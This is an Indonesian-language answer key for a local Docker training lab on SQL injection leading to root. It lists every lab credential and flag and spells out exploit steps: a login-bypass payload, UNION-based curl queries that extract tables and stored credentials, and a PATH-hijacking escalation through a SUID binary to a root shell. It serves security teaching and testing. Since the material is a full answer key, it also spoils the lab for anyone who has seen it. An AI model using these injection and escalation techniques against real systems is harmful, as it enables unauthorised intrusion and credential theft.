# CyberLab: SQL Injection to Root — Panduan Kredensial & Perintah Akses Lengkap

Dokumen ini memuat seluruh kredensial, akun, flag, serta perintah (commands) operasional dan eksploitasi lengkap untuk lab **SQL Injection to Root Privilege Escalation**.

---

## 1. Ringkasan Kredensial Cepat (Cheat Sheet)

| Layanan / Target | Username | Password | Port / Lokasi | Keterangan |
| :--- | :--- | :--- | :--- | :--- |
| **Web Portal (Admin)** | `admin` | `Adm1n_Unbr3akabl3_K3y_2026!#` | `http://localhost:8000/login/` | Kredensial sah admin web |
| **Web Portal (Analyst)**| `analyst` | `AnalystP@ssw0rd987` | `http://localhost:8000/login/` | Akun staf analyst |
| **Web SQLi Bypass** | `admin' --` | *(Sembarang)* | `http://localhost:8000/login/` | Bypass auth tanpa password |
| **Linux SSH Shell** | `student` | `student_ctf_p4ssw0rd!` | Port `2223` (Host) | Akun shell Linux non-root |
| **Linux Root** | `root` | *(Via SUID PrivEsc)* | `/usr/local/bin/syshealth` | Eskalasi via PATH Hijacking |
| **PostgreSQL (App DB)** | `labuser` | `labpassword123` | Port `5432` (Internal Docker) | User koneksi Django ke DB `cyberlab` |
| **PostgreSQL Admin** | `db_admin` | `p0stgr3s_adm1n_loc4l!` | Tabel `system_credentials` | Kredensial tersimpan di DB |
| **Backup Operator** | `backup_operator` | `b4ckup_0p3rat0r_99!` | Tabel `system_credentials` | Kredensial tersimpan di DB |

---

## 2. Akses Aplikasi Web (Port 8000)

### Endpoint Utama
- **Beranda Web**: [http://localhost:8000/](http://localhost:8000/)
- **Halaman Login**: [http://localhost:8000/login/](http://localhost:8000/login/)
- **Katalog Produk (Vulnerable)**: [http://localhost:8000/products/](http://localhost:8000/products/)
- **Dashboard Flag**: [http://localhost:8000/dashboard/](http://localhost:8000/dashboard/)

---

### A. Login Menggunakan Akun Sah (Legitimate Credentials)
- **Akun Administrator**:
  - Username: `admin`
  - Password: `Adm1n_Unbr3akabl3_K3y_2026!#`
- **Akun Analyst**:
  - Username: `analyst`
  - Password: `AnalystP@ssw0rd987`

---

### B. Login Menggunakan SQL Injection Bypass (Stage 1)
Pada form login web ([http://localhost:8000/login/](http://localhost:8000/login/)):
- **Username**: `admin' --`
- **Password**: *(isi teks bebas, contoh: `p@ssword`)*

#### Perintah cURL Login Bypass:
```bash
# Login via curl dan simpan cookie session
curl -s -X POST http://localhost:8000/login/ \
  -d "username=admin' --" \
  -d "password=anything" \
  -c session_cookie.txt

# Akses dashboard menggunakan session cookie untuk melihat Flag 1
curl -s -b session_cookie.txt http://localhost:8000/dashboard/ | grep -i "FLAG{"
```

---

### C. Ekstraksi Data Melalui UNION SQL Injection (Stage 2)
Vulnerability berada pada parameter `category` di endpoint `/products/`.

#### 1. Enumerasi Daftar Tabel di Database:
```bash
curl -s "http://localhost:8000/products/?category=1%20UNION%20SELECT%20NULL,%20table_name,%20NULL,%20NULL,%20NULL%20FROM%20information_schema.tables%20WHERE%20table_schema='public'--"
```

#### 2. Mengambil Flag 2 (`challenge_flags`):
```bash
curl -s "http://localhost:8000/products/?category=1%20UNION%20SELECT%20NULL,%20flag_value,%20NULL,%20NULL,%20NULL%20FROM%20challenge_flags--"
```

#### 3. Mengambil Kredensial SSH Sistem (`system_credentials`):
```bash
curl -s "http://localhost:8000/products/?category=1%20UNION%20SELECT%20NULL,%20CONCAT(username,':',credential_value,':',purpose),%20NULL,%20NULL,%20NULL%20FROM%20system_credentials--"
```

---

## 3. Akses Shell SSH Linux (Port 2223)

- **Host**: `localhost` (atau IP host lab)
- **Port SSH**: `2223` (di-forward ke port 22 di container `sqli_lab_web`)
- **Username**: `student`
- **Password**: `student_ctf_p4ssw0rd!`

### Perintah Koneksi SSH Interaktif:
```bash
ssh -p 2223 student@localhost
```
*(Ketik `yes` jika muncul konfirmasi fingerprint, lalu masukkan password: `student_ctf_p4ssw0rd!`)*

### Perintah SSH Non-Interaktif (Satu Baris):
```bash
sshpass -p 'student_ctf_p4ssw0rd!' ssh -p 2223 -o StrictHostKeyChecking=no student@localhost
```

### Membaca Flag User (Stage 3):
Setelah berhasil login SSH:
```bash
cat /home/student/user.flag
```
Output:
```
FLAG{USER_SHELL_ACQUIRED}
```

---

## 4. Eksploitasi Privilege Escalation ke Root (Stage 4)

Setelah masuk sebagai user `student`, terdapat program SUID biner di `/usr/local/bin/syshealth` yang memanggil `healthcheck` tanpa path absolut (rentan terhadap **PATH Hijacking**).

### Langkah dan Perintah Eksploitasi:
Jalankan perintah berikut di sesi shell `student`:

```bash
# 1. Masuk ke direktori temporary yang world-writable
cd /tmp

# 2. Buat script palsu bernama 'healthcheck' yang akan mengeksekusi bash dengan hak SUID (-p)
echo -e '#!/bin/bash\n/bin/bash -p' > healthcheck

# 3. Beri izin eksekusi
chmod +x healthcheck

# 4. Modifikasi environment PATH agar /tmp dicari pertama kali
export PATH=/tmp:$PATH

# 5. Eksekusi program SUID syshealth
/usr/local/bin/syshealth
```

### Membaca Flag Root:
Setelah root shell terbuka (ditandai prompt `bash-5.x#` atau `#`):
```bash
# Cek identitas
id

# Baca flag root
cat /root/root.flag
```
Output:
```
FLAG{ROOT_COMPROMISED}
```

---

## 5. Akses Database PostgreSQL Internal

Database berjalan di container `sqli_lab_db` dan hanya terhubung ke network internal `lab-network` (port 5432 tidak dipublikasikan ke host demi keamanan skenario lab).

- **Database Host (Internal)**: `db`
- **Port Internal**: `5432`
- **Nama Database**: `cyberlab`
- **Username**: `labuser`
- **Password**: `labpassword123`

### A. Akses Langsung Menggunakan Docker Compose (Dari Host):
```bash
# Masuk ke CLI interactive psql
docker compose exec db psql -U labuser -d cyberlab
```

### B. Akses psql dari Sesi Shell SSH / Web Container:
```bash
# Dari sesi SSH student atau terminal web container
PGPASSWORD=labpassword123 psql -h db -U labuser -d cyberlab
```

### C. Query Penting di PostgreSQL:
```sql
-- Melihat seluruh tabel publik
\dt

-- Melihat isi tabel akun web
SELECT * FROM app_users;

-- Melihat isi tabel kredensial sistem
SELECT * FROM system_credentials;

-- Melihat tabel flag
SELECT * FROM challenge_flags;

-- Keluar dari psql
\q
```

---

## 6. Akses Administratif Docker (Host Management)

Perintah khusus pengelola lab/penguji untuk inspeksi langsung tanpa melalui alur eksploitasi:

```bash
# Masuk langsung sebagai ROOT ke container Web
docker compose exec web bash
# atau
docker exec -it sqli_lab_web bash

# Masuk langsung ke container Database
docker compose exec db sh
# atau
docker exec -it sqli_lab_db sh

# Melihat status container dan port mapping
docker compose ps

# Melihat log aplikasi secara realtime
docker compose logs -f web

# Menjalankan script test otomatis validasi lab
./test_lab.sh

# Reset ulang database dan flag ke kondisi awal
./reset.sh
```

---

## 7. Daftar Lengkap CTF Flags

| Tahap | Kategori / Lokasi | Flag |
| :--- | :--- | :--- |
| **Stage 1** | Web Login Authentication Bypass | `FLAG{SQLI_LOGIN_BYPASS}` |
| **Stage 2** | Database Information Disclosure / UNION SQLi | `FLAG{DATABASE_ENUMERATION}` |
| **Stage 3** | Linux User Shell Access (`/home/student/user.flag`) | `FLAG{USER_SHELL_ACQUIRED}` |
| **Stage 4** | Root Privilege Escalation (`/root/root.flag`) | `FLAG{ROOT_COMPROMISED}` |

---

## 8. Panduan Reset Lingkungan Lab

Jika ingin membersihkan container atau mengulang lab dari kondisi awal yang bersih:
```bash
# Metode 1: Menggunakan skrip reset bawaan
./reset.sh

# Metode 2: Manual via docker compose
docker compose down -v
docker compose up -d --build
```
